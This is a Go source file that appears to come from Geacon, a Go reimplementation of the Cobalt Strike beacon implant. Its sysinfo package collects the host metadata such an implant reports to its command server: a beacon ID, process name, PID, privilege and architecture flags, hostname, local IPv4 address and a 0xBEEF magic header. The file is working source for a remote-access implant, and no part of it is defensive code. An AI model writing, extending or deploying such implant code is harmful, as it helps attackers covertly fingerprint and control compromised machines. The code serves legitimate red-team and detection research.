package sysinfo

import (
	"encoding/binary"
	"main/config"
	"main/crypt"
	"net"
	"os"
	"runtime"
	"strings"
)

var ANSICodePage uint32

func GeaconID() int {
	randomInt := crypt.RandomInt(100000, 999998)
	if randomInt%2 == 0 {
		return randomInt
	} else {
		return randomInt + 1
	}
}

func GetProcessName() string {
	processName := os.Args[0]
	// C:\Users\admin\Desktop\cmd.exe
	// ./cmd
	var result string
	slashPos := strings.LastIndex(processName, "\\")
	if slashPos > 0 {
		result = processName[slashPos+1:]
	}
	backslashPos := strings.LastIndex(processName, "/")
	if backslashPos > 0 {
		result = processName[backslashPos+1:]
	}
	// stupid length limit
	if len(result) > 10 {
		result = result[len(result)-9:]
	}
	return result
}

func GetPID() int {
	return os.Getpid()
}

func GetMetaDataFlag() int {
	flagInt := 0
	if IsHighPriv() {
		flagInt += 8
	}
	isOSX64, _ := IsOSX64()
	if isOSX64 {
		flagInt += 4
	}
	isProcessX64 := IsProcessX64()
	// there is no need to add 1 one process is x86
	// doing this only makes error happen
	if isProcessX64 {
		flagInt += 2
	}
	return flagInt
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size
	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	if len(sHostName) > config.ComputerNameLength {
		return sHostName[:config.ComputerNameLength]
	}
	return sHostName
}

func GetLocalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				if len(ipnet.IP) == 16 {
					return binary.LittleEndian.Uint32(ipnet.IP[12:16])
				}
				return binary.LittleEndian.Uint32(ipnet.IP)
			}
		}
	}
	return 0
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
